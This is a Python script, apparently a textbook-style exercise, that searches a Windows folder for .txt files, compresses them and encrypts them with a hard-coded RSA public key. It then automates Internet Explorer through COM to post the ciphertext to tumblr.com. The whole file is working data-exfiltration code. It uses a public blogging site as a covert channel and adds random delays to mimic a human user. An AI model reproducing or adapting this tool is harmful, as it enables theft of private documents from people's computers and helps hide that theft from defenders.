import win32com.client
import os
import fnmatch
import time
import random
import zlib
import base64

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".txt"
username = "username"
password = "password"

public_key = b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs7RXkZdpnzK1ybre0ooS\n5rRByRnU6GHPoIhnHcT5lBrsFiFuu9kilu/zTcVKomFzoKsraOTLqD00RKlwr7O4\n1CjUKJCt5CKGHOmdKOUEEzCis9ZkX0QUYnlwmHPx65GN0FC0OWuei7QpxRLNBOTb\nsLU6nve5X0AauPV6qY8mywZm7JrZd5zjGE4jXBvy0cUxhhbhfGgju4JZ7xuYLTAt\ntnJzouk4LiVWxwodnVcV/IufRnESQHdcNXa75oc7QIfb6GXqZhiQhehZOGsv06RA\nmhXgjGyVDKz7tOcI0ssOoXBSp+BSqNQaHipLf3LtqWsSeORYkGRrvR0q4RodTNU2\nfwIDAQAB\n-----END PUBLIC KEY-----'

def decode_base64(data):
    """Decode base64, padding being optional.

    :param data: Base64 data as an ASCII byte string
    :returns: The decoded byte string.

    """
    missing_padding = len(data) % 4
    if missing_padding != 0:
        print("missing",missing_padding)
        data += '='# * (4 - missing_padding)
        
    print(data)
    return base64.decodestring(data.encode())
def wait_for_browser(browser):
    # wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    return


def encrypt_string(plaintext1):
    
    chunk_size = 128
    print ("Compressing: {} bytes".format(len(plaintext1)))
    print(type(plaintext1))
    # plaintext = plaintext1.encode()
    # plaintext = plaintext1
    plaintext = zlib.compress(plaintext1)

    print ("Encrypting {} bytes".format(len(plaintext)))
  
    # rsakey = RSA.importKey(decode_base64(public_key))
    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)

    encrypted = b""
    offset = 0
    while offset < len(plaintext):
        chunk = plaintext[offset:offset+chunk_size]
        if len(chunk) % chunk_size != 0:
            chunk += b" " * (chunk_size - len(chunk))
        
        encrypted += rsakey.encrypt(chunk)
        offset += chunk_size

    # encrypted = encrypted.encode("base64")

    print ("Base64 encoded crypto: {}".format(len(encrypted)))

    return encrypted


def encrypt_post(filename):
    # open and read the file
    fd = open(filename, "rb")
    contents = fd.read()
    fd.close()

    encrypted_title = encrypt_string(filename.encode())
    encrypted_body = encrypt_string(contents)

    return encrypted_title, encrypted_body


def random_sleep():
    time.sleep(random.randint(5, 10))
    return


def login_to_tumblr(ie):
    # retrieve all elements in the document
    full_doc = ie.Document.all

    # iterate looking for the login form
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value", username)
        elif i.id == "signup_password":
            i.setAttribute("value", password)

    random_sleep()

    # you can be presented with different home pages
    try:
        print(ie.Document.forms[0].id)
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError as e:
        print("error1")
        pass

    random_sleep()

    # the login form is the second form on the page
    wait_for_browser(ie)


def post_to_tumblr(ie, title, post):
    full_doc = ie.Document.all 
    title_box = full_doc[0]
    post_form = full_doc[0]
    count = 0
    for i in full_doc:
        # if i.id != '':
            # print(i.id)

            
        if count > 0:
            if i.id == '':
                # i.value=title
                count -= 1
                if count == 0:
                    i.setAttribute("content", title)
                    title_box = i
                    i.focus()
        
        if i.id == "post_controls_avatar":
            print("found")
            print(i)
            count = 30
            continue
        elif i.id == "post_two":
            i.setAttribute("innerHTML", post)
            print ("Set text area")
            i.focus()
        elif i.id == "create_post":
            print ("Found post button")
            post_form = i
            i.focus()

    # move focus away from the main content box
    random_sleep()
    title_box.focus()
    random_sleep()

    # post the form
    post_form.children[0].click()
    wait_for_browser(ie)

    random_sleep()


def exfiltrate(document_path):
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible = 1

    # head to tumblr and login
    # ie.Navigate("http://www.tumblr.com/login")
    # wait_for_browser(ie)

    # print ("Logging in...")
    # login_to_tumblr(ie) 
    # wait_for_browser(ie)

    print ("Logged in... navigating")
    ie.Navigate("https://www.tumblr.com/new/text")
    wait_for_browser(ie)

    # encrypt the file
    title, body = encrypt_post(document_path)

    print ("Creating new post...")
    post_to_tumblr(ie, title, body)
    print ("Posted!")

    # destroy the IE instance
    input("press any key to quit")
    ie.Quit()
    ie = None


# main loop for document discovery
for parent, directories, filenames in os.walk("C:\\test\\"):
    for filename in fnmatch.filter(filenames, "*%s" % doc_type):
        print(filename)
        document_path = os.path.join(parent, filename)
        print ("Found: {}".format(document_path))
        exfiltrate(document_path)